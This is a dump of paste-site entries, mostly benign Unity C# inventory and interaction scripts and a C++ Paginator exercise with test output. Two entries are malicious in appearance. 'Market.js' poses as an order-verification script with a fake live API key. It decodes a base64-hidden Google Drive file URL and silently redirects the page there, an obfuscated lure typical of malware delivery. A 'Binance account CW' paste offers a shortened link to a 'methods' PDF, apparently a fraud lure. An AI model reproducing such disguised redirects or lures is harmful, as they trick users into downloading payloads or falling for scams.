id,title,username,language,date,content
v3rQCvND,Item - Part 6.1,evelynshilosky,C#,Thursday 27th of March 2025 01:05:13 PM CDT,"using UnityEngine;

public class Item : MonoBehaviour
{
    public string itemName;
    public bool isTwoHanded;
    public bool isStorageItem;
    public int storageCapacity;
    public Sprite icon;

    public string description = """";
    public string itemUses = """";

    // Separate offsets for left and right hands when holding one item
    public Vector3 leftPositionOffset = Vector3.zero;
    public Vector3 leftRotationOffset = Vector3.zero;
    public Vector3 rightPositionOffset = Vector3.zero;
    public Vector3 rightRotationOffset = Vector3.zero;

    // New offsets for left and right hands when holding two items
    public Vector3 leftTwoPositionOffset = Vector3.zero;
    public Vector3 leftTwoRotationOffset = Vector3.zero;
    public Vector3 rightTwoPositionOffset = Vector3.zero;
    public Vector3 rightTwoRotationOffset = Vector3.zero;

    // Edible item properties
    public bool isEdible = false;
    public float healthEffect = 0f;
    public float hydrationEffect = 0f;
    public float calorieEffect = 0f;

    // Backpack property
    public bool isBackpack = false;

    public virtual void Use()
    {
        Debug.Log($""Using {itemName}"");
    }
}
"
vh9Mrywm,UIHelperFunctions - Part 6.1,evelynshilosky,C#,Thursday 27th of March 2025 01:04:21 PM CDT,"using UnityEngine;
using UnityEngine.UI;
using UnityEngine.EventSystems;
using System.Collections.Generic;
using TMPro;

public class UIHelperFunctions : MonoBehaviour
{
    public static UIHelperFunctions Instance { get; private set; }

    private void Awake()
    {
        if (Instance == null)
        {
            Instance = this;
            DontDestroyOnLoad(gameObject);
        }
        else
        {
            Destroy(gameObject);
        }
    }

    public void TransferHeldItemsToStorage(InventorySystem inventorySystem, StorageSystem storageSystem, Item currentStorageItem, PlayerMovement playerMovement)
    {
        if (inventorySystem.leftHandItem != null)
        {
            bool added = storageSystem.AddToStorage(currentStorageItem, inventorySystem.leftHandItem);
            if (added)
            {
                inventorySystem.UnequipItem(true);
                playerMovement.UpdateCarryingAnimations();
            }
        }
        if (inventorySystem.rightHandItem != null)
        {
            bool added = storageSystem.AddToStorage(currentStorageItem, inventorySystem.rightHandItem);
            if (added)
            {
                inventorySystem.UnequipItem(false);
                playerMovement.UpdateCarryingAnimations();
            }
        }
    }

    public void PopulateInventoryUI(Item storageItem, Transform inventorySlotParent, StorageSystem storageSystem, UIManager uiManager)
    {
        ClearInventoryUI(inventorySlotParent);
        List<Item> storageInventory = storageSystem.GetStorageInventory(storageItem);

        for (int i = 0; i < inventorySlotParent.childCount - 3; i++)
        {
            Transform slot = inventorySlotParent.GetChild(i);
            ClearInventorySlot(slot.gameObject);
        }

        foreach (Item item in storageInventory)
        {
            int slotIndex = storageSystem.GetItemSlotIndex(storageItem, item);
            if (slotIndex == -1 || slotIndex >= inventorySlotParent.childCount - 3)
            {
                slotIndex = FindFirstEmptySlot(inventorySlotParent);
            }

            if (slotIndex != -1)
            {
                Transform slot = inventorySlotParent.GetChild(slotIndex);
                uiManager.UpdateInventorySlot(slot.gameObject, item);
                storageSystem.UpdateItemPosition(storageItem, item, slotIndex);
            }
        }
    }

    public void UpdateInventorySlot(GameObject slotObject, Item item, GameObject itemIconPrefab, UIManager uiManager)
    {
        ClearInventorySlot(slotObject);

        GameObject iconObject = Instantiate(itemIconPrefab, slotObject.transform);
        Image iconImage = iconObject.GetComponent<Image>();
        if (iconImage != null)
        {
            iconImage.sprite = item.icon;
            iconImage.enabled = true;
        }

        iconObject.AddComponent<ItemReference>().item = item;

        EventTrigger trigger = iconObject.GetComponent<EventTrigger>();
        if (trigger == null) trigger = iconObject.AddComponent<EventTrigger>();

        trigger.triggers.Clear();

        EventTrigger.Entry rightClickEntry = new EventTrigger.Entry();
        rightClickEntry.eventID = EventTriggerType.PointerClick;
        rightClickEntry.callback.AddListener((data) => {
            if (((PointerEventData)data).button == PointerEventData.InputButton.Right)
                uiManager.TryEquipItem(item);
        });

        EventTrigger.Entry dragEntry = new EventTrigger.Entry();
        dragEntry.eventID = EventTriggerType.BeginDrag;
        dragEntry.callback.AddListener((data) => uiManager.BeginDrag(iconObject.transform));

        EventTrigger.Entry dragEndEntry = new EventTrigger.Entry();
        dragEndEntry.eventID = EventTriggerType.EndDrag;
        dragEndEntry.callback.AddListener((data) => uiManager.EndDrag(iconObject.transform));

        EventTrigger.Entry pointerEnterEntry = new EventTrigger.Entry();
        pointerEnterEntry.eventID = EventTriggerType.PointerEnter;
        pointerEnterEntry.callback.AddListener((data) => uiManager.ShowItemDetails(item));

        EventTrigger.Entry pointerExitEntry = new EventTrigger.Entry();
        pointerExitEntry.eventID = EventTriggerType.PointerExit;
        pointerExitEntry.callback.AddListener((data) => uiManager.HideItemDetails());

        trigger.triggers.Add(rightClickEntry);
        trigger.triggers.Add(dragEntry);
        trigger.triggers.Add(dragEndEntry);
        trigger.triggers.Add(pointerEnterEntry);
        trigger.triggers.Add(pointerExitEntry);
    }

    public void ShowItemDetails(Item item, GameObject itemDetailsPanel, TextMeshProUGUI itemTitleText, TextMeshProUGUI itemDescriptionText, TextMeshProUGUI itemUsesText)
    {
        if (item != null && itemDetailsPanel != null)
        {
            itemDetailsPanel.SetActive(true);
            if (itemTitleText != null) itemTitleText.text = item.itemName;
            if (itemDescriptionText != null) itemDescriptionText.text = item.description;
            if (itemUsesText != null) itemUsesText.text = item.itemUses;
        }
    }

    public void HideItemDetails(GameObject itemDetailsPanel)
    {
        if (itemDetailsPanel != null)
        {
            itemDetailsPanel.SetActive(false);
        }
    }

    public void TryEquipItem(Item item, InventorySystem inventorySystem, StorageSystem storageSystem, Item currentStorageItem, InteractionSystem interactionSystem, PlayerMovement playerMovement, UIManager uiManager)
    {
        if (inventorySystem.leftHandItem != null && inventorySystem.rightHandItem != null)
        {
            uiManager.ShowError(""Hands are full!"");
            return;
        }

        storageSystem.RemoveItemFromStorage(currentStorageItem, item);
        bool isLeftHand = inventorySystem.leftHandItem == null;
        inventorySystem.EquipItem(item, isLeftHand, item.isTwoHanded);
        interactionSystem.UpdateItemPosition(item.gameObject, isLeftHand);
        playerMovement.UpdateCarryingAnimations();
        uiManager.PopulateInventoryUI(currentStorageItem);
        uiManager.HideItemDetails();
    }

    public void BeginDrag(Transform iconTransform, ref Item draggedItem, ref Transform originalSlot, GameObject inventoryPanel)
    {
        ItemReference itemRef = iconTransform.GetComponent<ItemReference>();
        if (itemRef != null && itemRef.item != null)
        {
            draggedItem = itemRef.item;
            originalSlot = iconTransform.parent;
            iconTransform.SetParent(inventoryPanel.transform);
        }
    }

    public void EndDrag(Transform iconTransform, Item draggedItem, Transform originalSlot, Transform inventorySlotParent, Item currentStorageItem, StorageSystem storageSystem, UIManager uiManager)
    {
        if (draggedItem == null) return;

        Transform closestSlot = FindClosestSlot(inventorySlotParent, Input.mousePosition);

        if (closestSlot != null)
        {
            SwapItems(closestSlot, iconTransform, originalSlot, currentStorageItem, storageSystem);
        }
        else
        {
            ReturnItemToOriginalSlot(iconTransform, originalSlot);
        }
    }

    private void ClearInventoryUI(Transform inventorySlotParent)
    {
        for (int i = 0; i < inventorySlotParent.childCount - 3; i++)
        {
            Transform slot = inventorySlotParent.GetChild(i);
            ClearInventorySlot(slot.gameObject);
        }
    }

    private void ClearInventorySlot(GameObject slotObject)
    {
        foreach (Transform child in slotObject.transform)
        {
            Destroy(child.gameObject);
        }
    }

    public int FindFirstEmptySlot(Transform inventorySlotParent)
    {
        for (int i = 0; i < inventorySlotParent.childCount - 3; i++)
        {
            if (inventorySlotParent.GetChild(i).childCount == 0)
            {
                return i;
            }
        }
        return -1;
    }

    private Transform FindClosestSlot(Transform inventorySlotParent, Vector3 position)
    {
        Transform closestSlot = null;
        float minDistance = Mathf.Infinity;

        foreach (Transform slot in inventorySlotParent)
        {
            float dist = Vector3.Distance(slot.position, position);
            if (dist < minDistance)
            {
                minDistance = dist;
                closestSlot = slot;
            }
        }

        return closestSlot;
    }

    private void SwapItems(Transform newSlot, Transform draggedIcon, Transform originalSlot, Item currentStorageItem, StorageSystem storageSystem)
    {
        if (newSlot.childCount > 0)
        {
            Transform existingIcon = newSlot.GetChild(0);
            existingIcon.SetParent(originalSlot);
            existingIcon.localPosition = Vector3.zero;

            Item existingItem = existingIcon.GetComponent<ItemReference>().item;
            storageSystem.UpdateItemPosition(currentStorageItem, existingItem, originalSlot.GetSiblingIndex());
        }

        draggedIcon.SetParent(newSlot);
        draggedIcon.localPosition = Vector3.zero;

        Item draggedItem = draggedIcon.GetComponent<ItemReference>().item;
        storageSystem.UpdateItemPosition(currentStorageItem, draggedItem, newSlot.GetSiblingIndex());
    }

    private void ReturnItemToOriginalSlot(Transform draggedIcon, Transform originalSlot)
    {
        draggedIcon.SetParent(originalSlot);
        draggedIcon.localPosition = Vector3.zero;
    }

    public void TogglePlayerControls(bool enable, PlayerMovement playerMovement)
    {
        if (playerMovement != null)
        {
            playerMovement.enabled = enable;
            playerMovement.GetComponent<MouseMovement>().enabled = enable;
        }

        Cursor.lockState = enable ? CursorLockMode.Locked : CursorLockMode.None;
        Cursor.visible = !enable;
    }
}
"
SGs0tBaF,MouseMovement - Part 6.1,evelynshilosky,C#,Thursday 27th of March 2025 01:02:43 PM CDT,"using UnityEngine;

public class MouseMovement : MonoBehaviour
{
    public float mouseSensitivity = 100f;
    public float minVerticalRotation = -90f;
    public float maxVerticalRotation = 90f;

    private float verticalRotation = 0f;
    private PlayerMovement playerMovement;
    private Transform currentCamera;
    private bool controlsEnabled = true;

    void Start()
    {
        Cursor.lockState = CursorLockMode.Locked;
        playerMovement = GetComponent<PlayerMovement>();
        UpdateCameraReference();
    }

    void Update()
    {
        if (controlsEnabled && !UIManager.Instance.isInventoryOpen)
        {
            UpdateCameraReference();
            HandleMouseMovement();
        }
    }

    void UpdateCameraReference()
    {
        currentCamera = playerMovement.isMale ? playerMovement.maleCamera : playerMovement.femaleCamera;
    }

    void HandleMouseMovement()
    {
        float mouseX = Input.GetAxis(""Mouse X"") * mouseSensitivity * Time.deltaTime;
        float mouseY = Input.GetAxis(""Mouse Y"") * mouseSensitivity * Time.deltaTime;

        verticalRotation -= mouseY;
        verticalRotation = Mathf.Clamp(verticalRotation, minVerticalRotation, maxVerticalRotation);

        currentCamera.localRotation = Quaternion.Euler(verticalRotation, 0f, 0f);
        transform.Rotate(Vector3.up * mouseX);
    }

    public float GetVerticalRotation()
    {
        return verticalRotation;
    }

    public void SetControlsEnabled(bool enabled)
    {
        controlsEnabled = enabled;
        Cursor.lockState = enabled ? CursorLockMode.Locked : CursorLockMode.None;
        Cursor.visible = !enabled;
    }
}"
SNz4hWxq,StorageInteractable - Part 6.1,evelynshilosky,C#,Thursday 27th of March 2025 01:01:59 PM CDT,"using UnityEngine;

public class StorageInteractable : InteractableObject
{
    public Transform storageHolder;

    private void Awake()
    {
        item = GetComponent<Item>();
        if (item == null)
        {
            Debug.LogError(""StorageInteractable requires an Item component on the same GameObject."");
            enabled = false;
        }
    }

    private void Start()
    {
        if (item != null && storageHolder != null)
        {
            StorageSystem.Instance.InitializeStorage(item);
            StorageSystem.Instance.RegisterStorage(item, storageHolder);
        }
        else
        {
            Debug.LogError(""StorageInteractable is missing item or storageHolder reference."");
        }
    }

    public override void Interact(PlayerMovement playerMovement, bool isRightClick)
    {
        if (isRightClick)
        {
            UIManager.Instance.ShowInventoryPrompt(item);
        }
        else
        {
            base.Interact(playerMovement, isRightClick);
        }
    }
}
"
CTVvS3z1,StorageSystem - Part 6.1,evelynshilosky,C#,Thursday 27th of March 2025 01:01:12 PM CDT,"using UnityEngine;
using System.Collections.Generic;

public class StorageSystem : MonoBehaviour
{
    public static StorageSystem Instance { get; private set; }

    private Dictionary<Item, List<Item>> storageInventories = new Dictionary<Item, List<Item>>();
    private Dictionary<Item, Transform> storageHolders = new Dictionary<Item, Transform>();
    private Dictionary<Item, Dictionary<Item, int>> storageSlotPositions = new Dictionary<Item, Dictionary<Item, int>>();

    private void Awake()
    {
        if (Instance == null)
        {
            Instance = this;
            DontDestroyOnLoad(gameObject);
        }
        else
        {
            Destroy(gameObject);
        }
    }

    private void Start()
    {
        if (InventorySystem.Instance.backpack != null)
        {
            InitializeStorage(InventorySystem.Instance.backpack);
        }
    }

    public void InitializeStorage(Item storageItem)
    {
        if (!storageInventories.ContainsKey(storageItem))
        {
            storageInventories[storageItem] = new List<Item>();
            storageHolders[storageItem] = storageItem.transform;
            storageSlotPositions[storageItem] = new Dictionary<Item, int>();
        }
    }

    public void RegisterStorage(Item storageItem, Transform holder)
    {
        if (!storageHolders.ContainsKey(storageItem))
        {
            storageHolders.Add(storageItem, holder);
            storageSlotPositions[storageItem] = new Dictionary<Item, int>();
        }
    }

    public bool AddToStorage(Item storageItem, Item itemToStore, int slotIndex = -1)
    {
        if (storageItem == null)
        {
            Debug.LogError(""Attempted to add item to null storage"");
            return false;
        }

        if (!storageInventories.ContainsKey(storageItem))
        {
            InitializeStorage(storageItem);
        }

        if (storageInventories[storageItem].Count < storageItem.storageCapacity)
        {
            storageInventories[storageItem].Add(itemToStore);
            itemToStore.gameObject.SetActive(false);

            if (storageHolders.ContainsKey(storageItem))
            {
                itemToStore.transform.SetParent(storageHolders[storageItem]);
            }

            if (slotIndex >= 0)
            {
                storageSlotPositions[storageItem][itemToStore] = slotIndex;
            }
            return true;
        }
        return false;
    }

    public void RemoveItemFromStorage(Item storageItem, Item itemToRemove)
    {
        if (storageInventories.TryGetValue(storageItem, out List<Item> items))
        {
            items.Remove(itemToRemove);
            itemToRemove.gameObject.SetActive(true);
            itemToRemove.transform.SetParent(null);

            if (storageSlotPositions.ContainsKey(storageItem))
            {
                storageSlotPositions[storageItem].Remove(itemToRemove);
            }
        }
    }

    public void OpenStorage(Item storageItem)
    {
        if (UIManager.Instance == null)
        {
            Debug.LogError(""UIManager reference is null in StorageSystem"");
            return;
        }

        if (storageItem == null)
        {
            Debug.LogError(""Attempted to open storage for a null item"");
            return;
        }

        UIManager.Instance.ShowInventoryPrompt(storageItem);
    }

    public List<Item> GetStorageInventory(Item storageItem)
    {
        if (storageInventories.TryGetValue(storageItem, out List<Item> items))
        {
            return items;
        }
        return new List<Item>();
    }

    public int GetAvailableSlots(Item storageItem)
    {
        if (!storageInventories.ContainsKey(storageItem))
        {
            return storageItem.storageCapacity;
        }
        return storageItem.storageCapacity - storageInventories[storageItem].Count;
    }

    public void UpdateItemPosition(Item storageItem, Item item, int newSlotIndex)
    {
        if (storageSlotPositions.ContainsKey(storageItem))
        {
            storageSlotPositions[storageItem][item] = newSlotIndex;
        }
    }

    public int GetItemSlotIndex(Item storageItem, Item item)
    {
        if (storageSlotPositions.ContainsKey(storageItem) && storageSlotPositions[storageItem].ContainsKey(item))
        {
            return storageSlotPositions[storageItem][item];
        }
        return -1;
    }
}
"
taJAebPm,InteractionSystem - Part 6.1,evelynshilosky,C#,Thursday 27th of March 2025 01:00:17 PM CDT,"using UnityEngine;
using System.Collections.Generic;

public class InteractionSystem : MonoBehaviour
{
    public Transform leftObjectHolder;
    public Transform rightObjectHolder;
    public LayerMask pickupLayer;
    public float placementDistance = 5f;
    public LayerMask placementLayerMask;
    public float previewUpdateInterval = 0.1f;
    public float placementHeightOffset = 0.1f;
    public float rotationIncrement = 45f;
    public Transform backpackWearPosition;

    private InventorySystem inventorySystem;
    private PlayerMovement playerMovement;
    private UIManager uiManager;
    private bool isPrecisionDrop = false;
    private Dictionary<GameObject, int> originalLayers = new Dictionary<GameObject, int>();
    private float lastPreviewUpdateTime;
    private bool isRotating = false;
    private Vector3 currentRotation;
    private List<GameObject> previewObjects = new List<GameObject>();
    public Item currentBackpackItem;

    private void Start()
    {
        inventorySystem = InventorySystem.Instance;
        playerMovement = GetComponent<PlayerMovement>();
        uiManager = UIManager.Instance;
        UpdateItemVisibility();
    }

    private void Update()
    {
        if (isPrecisionDrop)
        {
            UpdatePlacementPreview();
            HandleRotation();
        }
        else
        {
            ClearPreviewObjects();
        }

        if (Input.GetKeyDown(KeyCode.E) && currentBackpackItem != null && !inventorySystem.IsBackpackEquipped)
        {
            WearBackpack();
        }
    }

    public void TryPickUpItem(InteractableObject interactable)
    {
        Item item = interactable.item;

        if (item.isBackpack && !inventorySystem.IsBackpackEquipped)
        {
            PickUpBackpack(item);
        }
        else
        {
            bool isLeftHand = inventorySystem.rightHandItem != null && inventorySystem.leftHandItem == null;
            EquipItem(item, isLeftHand, item.isTwoHanded);
            playerMovement.UpdateCarryingAnimations();
        }
    }

    private void PickUpBackpack(Item backpackItem)
    {
        bool isLeftHand = inventorySystem.rightHandItem != null && inventorySystem.leftHandItem == null;
        EquipItem(backpackItem, isLeftHand, false);
        currentBackpackItem = backpackItem;
        uiManager.ShowBackpackPrompt(backpackItem);
    }

    public void HandleBackpackPrompt(bool accepted)
    {
        if (accepted)
        {
            WearBackpack();
        }
        else
        {
            uiManager.UpdateBackpackPrompt();
            // Don't close the prompt here
        }
    }

    public void WearBackpack()
    {
        if (currentBackpackItem != null)
        {
            bool wasLeftHand = inventorySystem.leftHandItem == currentBackpackItem;
            inventorySystem.UnequipItem(wasLeftHand);

            currentBackpackItem.transform.SetParent(backpackWearPosition);
            currentBackpackItem.transform.localPosition = Vector3.zero;
            currentBackpackItem.transform.localRotation = Quaternion.identity;

            Destroy(currentBackpackItem.GetComponent<Rigidbody>());
            MeshCollider meshCollider = currentBackpackItem.GetComponent<MeshCollider>();
            if (meshCollider != null) meshCollider.enabled = false;

            inventorySystem.EquipBackpack(currentBackpackItem);
            currentBackpackItem = null;

            uiManager.ClosePrompt();
            playerMovement.UpdateCarryingAnimations();
        }
    }

    public void UnequipBackpack()
    {
        if (inventorySystem.IsBackpackEquipped)
        {
            Item backpack = inventorySystem.backpack;
            inventorySystem.UnequipBackpack();

            MeshCollider meshCollider = backpack.GetComponent<MeshCollider>();
            if (meshCollider != null) meshCollider.enabled = true;

            if (backpack.GetComponent<Rigidbody>() == null)
            {
                backpack.gameObject.AddComponent<Rigidbody>();
            }

            backpack.transform.SetParent(null);
            backpack.transform.position = transform.position + transform.forward * 1.5f;

            playerMovement.UpdateCarryingAnimations();
        }
    }

    private void EquipItem(Item item, bool isLeftHand, bool isTwoHanded)
    {
        inventorySystem.EquipItem(item, isLeftHand, isTwoHanded);
        UpdateItemPosition(item.gameObject, isLeftHand);
        ChangeItemLayer(item.gameObject, pickupLayer);
        playerMovement.UpdateCarryingAnimations();
    }

    public void UpdateItemPosition(GameObject itemObject, bool isLeftHand)
    {
        Transform objectHolder = isLeftHand ? leftObjectHolder : rightObjectHolder;
        Item item = itemObject.GetComponent<Item>();
        Vector3 positionOffset = isLeftHand ? item.leftPositionOffset : item.rightPositionOffset;
        Vector3 rotationOffset = isLeftHand ? item.leftRotationOffset : item.rightRotationOffset;

        itemObject.transform.SetParent(objectHolder);
        itemObject.transform.localPosition = positionOffset;
        itemObject.transform.localRotation = Quaternion.Euler(rotationOffset);
    }

    private void UpdateItemVisibility()
    {
        if (inventorySystem.leftHandItem != null)
        {
            inventorySystem.leftHandItem.gameObject.SetActive(!isPrecisionDrop);
        }
        if (inventorySystem.rightHandItem != null)
        {
            inventorySystem.rightHandItem.gameObject.SetActive(!isPrecisionDrop);
        }
    }

    private void UpdatePlacementPreview()
    {
        if (Time.time - lastPreviewUpdateTime < previewUpdateInterval) return;

        lastPreviewUpdateTime = Time.time;

        RaycastHit hit;
        if (Physics.Raycast(Camera.main.transform.position, Camera.main.transform.forward, out hit, placementDistance, placementLayerMask))
        {
            List<Item> itemsToPlace = new List<Item>();
            if (inventorySystem.leftHandItem != null) itemsToPlace.Add(inventorySystem.leftHandItem);
            if (inventorySystem.rightHandItem != null) itemsToPlace.Add(inventorySystem.rightHandItem);

            ClearPreviewObjects();

            Vector3 previewPosition = hit.point + hit.normal * (0.05f + placementHeightOffset);
            Quaternion previewRotation = !isRotating ? Quaternion.LookRotation(hit.normal, Vector3.up) : Quaternion.Euler(currentRotation);

            for (int i = 0; i < itemsToPlace.Count; i++)
            {
                GameObject previewObj = Instantiate(itemsToPlace[i].gameObject);
                Destroy(previewObj.GetComponent<Rigidbody>());
                Destroy(previewObj.GetComponent<Collider>());
                previewObj.AddComponent<Outline>();

                previewObj.transform.position = previewPosition + Vector3.right * (i * 0.5f);
                previewObj.transform.rotation = previewRotation;

                Outline outline = previewObj.GetComponent<Outline>();
                outline.OutlineMode = Outline.Mode.OutlineAll;
                outline.OutlineColor = Color.green;
                outline.OutlineWidth = 5f;

                previewObjects.Add(previewObj);
                previewObj.SetActive(true);
            }

            bool canPlace = !Physics.Raycast(previewPosition, Vector3.down, placementHeightOffset + 0.05f, placementLayerMask);
            foreach (var obj in previewObjects)
            {
                obj.GetComponent<Outline>().OutlineColor = canPlace ? Color.green : Color.red;
            }
        }
        else
        {
            ClearPreviewObjects();
        }
    }

    private void HandleRotation()
    {
        if (Input.GetKeyDown(KeyCode.R))
        {
            isRotating = !isRotating;
            if (isRotating)
            {
                currentRotation = previewObjects[0].transform.rotation.eulerAngles;
                uiManager.ShowInventoryPrompt(null);
                uiManager.UpdatePromptText(""Rotation mode enabled. Use Q/E to rotate horizontally, Z/C to rotate vertically."");
                uiManager.ShowOkayButton();
            }
            else
            {
                uiManager.ShowInventoryPrompt(null);
                uiManager.UpdatePromptText(""Rotation mode disabled."");
                uiManager.ShowOkayButton();
            }
        }

        if (isRotating && previewObjects.Count > 0)
        {
            if (Input.GetKeyDown(KeyCode.Q))
            {
                currentRotation.y -= rotationIncrement;
            }
            else if (Input.GetKeyDown(KeyCode.E))
            {
                currentRotation.y += rotationIncrement;
            }
            else if (Input.GetKeyDown(KeyCode.Z))
            {
                currentRotation.x -= rotationIncrement;
            }
            else if (Input.GetKeyDown(KeyCode.C))
            {
                currentRotation.x += rotationIncrement;
            }

            foreach (var obj in previewObjects)
            {
                obj.transform.rotation = Quaternion.Euler(currentRotation);
            }
        }
    }

    public void DropItem(bool isLeftHand)
    {
        Item itemToDrop = isLeftHand ? inventorySystem.leftHandItem : inventorySystem.rightHandItem;
        if (itemToDrop != null)
        {
            GameObject itemObject = itemToDrop.gameObject;
            itemObject.transform.SetParent(null);

            Vector3 dropPosition;
            if (isPrecisionDrop && previewObjects.Count > 0)
            {
                int index = isLeftHand ? 0 : (previewObjects.Count > 1 ? 1 : 0);
                dropPosition = previewObjects[index].transform.position;
                itemObject.transform.position = dropPosition;
                itemObject.transform.rotation = previewObjects[index].transform.rotation;
            }
            else
            {
                dropPosition = transform.position + transform.forward * 1f + transform.right * Random.Range(-0.5f, 0.5f);
                itemObject.transform.position = dropPosition;
                itemObject.transform.rotation = Random.rotation;
            }

            itemObject.SetActive(true);

            Rigidbody rb = itemObject.GetComponent<Rigidbody>();
            if (rb == null) rb = itemObject.AddComponent<Rigidbody>();
            rb.isKinematic = false;
            rb.useGravity = true;
            rb.AddForce(Vector3.down * 2f, ForceMode.Impulse);

            inventorySystem.UnequipItem(isLeftHand);
            RestoreOriginalLayer(itemObject);

            InteractableObject interactable = itemObject.GetComponent<InteractableObject>();
            if (interactable != null)
            {
                interactable.enabled = true;
            }

            playerMovement.UpdateCarryingAnimations();
        }

        ClearPreviewObjects();

        if (inventorySystem.leftHandItem == null && inventorySystem.rightHandItem == null)
        {
            isPrecisionDrop = false;
            isRotating = false;
        }

        UpdateItemVisibility();
    }

    public void DropBothItems()
    {
        DropItem(true);
        DropItem(false);
    }

    public void ChangeItemLayer(GameObject itemObject, LayerMask newLayer)
    {
        if (!originalLayers.ContainsKey(itemObject))
        {
            originalLayers[itemObject] = itemObject.layer;
        }
        itemObject.layer = (int)Mathf.Log(newLayer.value, 2);
    }

    private void RestoreOriginalLayer(GameObject itemObject)
    {
        if (originalLayers.ContainsKey(itemObject))
        {
            itemObject.layer = originalLayers[itemObject];
            originalLayers.Remove(itemObject);
        }
    }

    public void TogglePrecisionDrop()
    {
        isPrecisionDrop = !isPrecisionDrop;
        UpdateItemVisibility();
        uiManager.ShowInventoryPrompt(null);
        uiManager.UpdatePromptText(isPrecisionDrop ? ""Precision drop enabled"" : ""Precision drop disabled"");
        uiManager.ShowOkayButton();
    }

    private void ClearPreviewObjects()
    {
        foreach (var obj in previewObjects)
        {
            Destroy(obj);
        }
        previewObjects.Clear();
    }

    public bool IsPrecisionDropEnabled()
    {
        return isPrecisionDrop;
    }
}
"
uQe1FBQF,Binance account CW,Cor3e3e3,JavaScript,Thursday 27th of March 2025 12:58:07 PM CDT," 
Pdf https://tinyurl.com/methodssss


034VqFOQXB
"
MJwF27w7,Market.js,rodrigomaise99,JavaScript,Thursday 27th of March 2025 12:53:38 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/166/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
hYePM22k,#red #week_1 #Шаблон_Paginator,mykhailo-orydoroha,C++,Thursday 27th of March 2025 12:49:01 PM CDT,"#include ""test_runner.h""

#include <numeric>
#include <iostream>
#include <vector>
#include <string>
using namespace std;

template <typename Iterator>
class PaginatorPage
{
public:
  PaginatorPage(Iterator begin, Iterator end)
  : begin_(begin), end_(end){}

  auto begin() const {
    return begin_;
  }

  auto end() const {
    return end_;
  }

  auto size() const {
    return distance(begin_, end_);
  }

  private:
  Iterator begin_, end_;
};

// Реализуйте шаблон класса Paginator

template <typename Iterator>
class Paginator {
public:
  Paginator(Iterator begin, Iterator end, size_t page_size) {
    for (auto it = begin; it != end;) {
      size_t current_page_size = std::min(page_size, static_cast<size_t>(std::distance(it, end)));
      auto next_it = std::next(it, current_page_size); // Use std::next to avoid modifying `it`
      pages.emplace_back(it, next_it);
      it = next_it; // Move iterator to next page start
    }
  }

  auto begin() const
  {return pages.begin();}

  auto end() const
  {return pages.end();}
  
  size_t size() const 
  {return pages.size();}
  
private:
  vector<PaginatorPage<Iterator>> pages;
};

template <typename C>
auto Paginate(C& c, size_t page_size) {
  // Реализуйте этот шаблон функции
  return Paginator(c.begin(), c.end(), page_size);
}

void TestPageCounts() {
  vector<int> v(15);

  ASSERT_EQUAL(Paginate(v, 1).size(), v.size());
  ASSERT_EQUAL(Paginate(v, 3).size(), 5u);
  ASSERT_EQUAL(Paginate(v, 5).size(), 3u);
  ASSERT_EQUAL(Paginate(v, 4).size(), 4u);
  ASSERT_EQUAL(Paginate(v, 15).size(), 1u);
  ASSERT_EQUAL(Paginate(v, 150).size(), 1u);
  ASSERT_EQUAL(Paginate(v, 14).size(), 2u);
}

void TestLooping() {
  vector<int> v(15);
  iota(begin(v), end(v), 1);

  Paginator<vector<int>::iterator> paginate_v(v.begin(), v.end(), 6);
  ostringstream os;
  for (const auto& page : paginate_v) {
    for (int x : page) {
      os << x << '.';
    }
    os << '\n';
  }
  ASSERT_EQUAL(os.str(), ""1.2.3.4.5.6.\n7.8.9.10.11.12.\n13.14.15.\n"");
}

void TestModification() {
  vector<string> vs = {""one"", ""two"", ""three"", ""four"", ""five""};
  for (auto page : Paginate(vs, 2)) {
    for (auto& word : page) {
      word[0] = toupper(word[0]); 
    }
  }

  const vector<string> expected = {""One"", ""Two"", ""Three"", ""Four"", ""Five""};
  ASSERT_EQUAL(vs, expected);
}

void TestPageSizes() {
  string letters(26, ' ');

  Paginator letters_pagination(letters.begin(), letters.end(), 11);
  vector<size_t> page_sizes;
  for (const auto& page : letters_pagination) {
    page_sizes.push_back(page.size());
  }

  const vector<size_t> expected = {11, 11, 4};
  ASSERT_EQUAL(page_sizes, expected);
}

void TestConstContainer() {
  const string letters = ""abcdefghijklmnopqrstuvwxyz"";

  vector<string> pages;
  for (const auto& page : Paginate(letters, 10)) {
    pages.push_back(string(page.begin(), page.end()));
  }

  const vector<string> expected = {""abcdefghij"", ""klmnopqrst"", ""uvwxyz""};
  ASSERT_EQUAL(pages, expected);
}

void TestPagePagination() {
  vector<int> v(22);
  iota(begin(v), end(v), 1);

  vector<vector<int>> lines;
  for (const auto& split_by_9 : Paginate(v, 9)) {
    for (const auto& split_by_4 : Paginate(split_by_9, 4)) {
      lines.push_back({});
      for (int item : split_by_4) {
        lines.back().push_back(item);
      }
    }
  }

  const vector<vector<int>> expected = {
      {1, 2, 3, 4},
      {5, 6, 7, 8},
      {9},
      {10, 11, 12, 13},
      {14, 15, 16, 17},
      {18},
      {19, 20, 21, 22}
  };
  ASSERT_EQUAL(lines, expected);
}

int main() {
  TestRunner tr;
  RUN_TEST(tr, TestPageCounts);
  RUN_TEST(tr, TestLooping);
  RUN_TEST(tr, TestModification);
  RUN_TEST(tr, TestPageSizes);
  RUN_TEST(tr, TestConstContainer);
  RUN_TEST(tr, TestPagePagination);
}

/*
==================
     Output
==================

TestPageCounts OK
TestLooping fail: Assertion failed: os.str() != ""1.2.3.4.5.6.\n7.8.9.10.11.12.\n13.14.15.\n"", Paginator.cpp:89 != 1.2.3.4.5.6.
7.8.9.10.11.12.
13.14.15.
